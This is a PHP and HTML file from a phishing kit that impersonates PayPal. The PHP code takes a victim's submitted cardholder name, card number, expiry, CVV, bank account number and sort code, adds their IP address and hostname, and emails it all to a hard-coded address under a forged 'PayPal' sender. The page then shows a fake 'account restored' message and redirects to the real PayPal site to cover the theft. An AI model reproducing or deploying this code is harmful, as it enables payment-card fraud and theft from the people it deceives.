<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "==================+ PaYPal CWX +==================\n";
$message .= "Name               : ".$_POST['01D']."\n\n";
$message .= "Card Number        : ".$_POST['02D']."\n\n";
$message .= "Exp Month          : ".$_POST['03D']."\n\n";
$message .= "Exp Year           : ".$_POST['04D']."\n\n";
$message .= "CVV                : ".$_POST['05D']."\n\n";
$message .= "Account Number     : ".$_POST['06D']."\n\n";
$message .= "Sort Code          : ".$_POST['07D']."\n\n";
$message .= "===================\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "====================+ CyberXPloit  +====================\n";
$rnessage = "$message\n";
$send= "rsaccount1991@live.com";
$subject = "CC | Paypal | $ip";
$headers = "From: PayPalCWX<cwxnetwork@exploit.net>";

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);

}
?>
<!DOCTYPE HTML5>
<html>
<head>
<META HTTP-EQUIV="Refresh" CONTENT="05; URL=https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Help/general/TopQuestion6-outside"> 
<meta charset="utf-8">
<title>Thank You - PayPal</title>
<link href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" rel="icon">
<link rel="stylesheet" type="text/css" href="css/loading.css">
</head>
<body>
        <div id="wrapper">
		<center>
		<h3>Your account has been successfully restored...</h3>
		
		<img class="ajax" src="images/ajax.gif">
		
		<p>Still loading after a few seconds? <a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Help/general/TopQuestion6-outside">Click here</a> to refresh</p>
		</center>
		
		</div>
</body>
</html>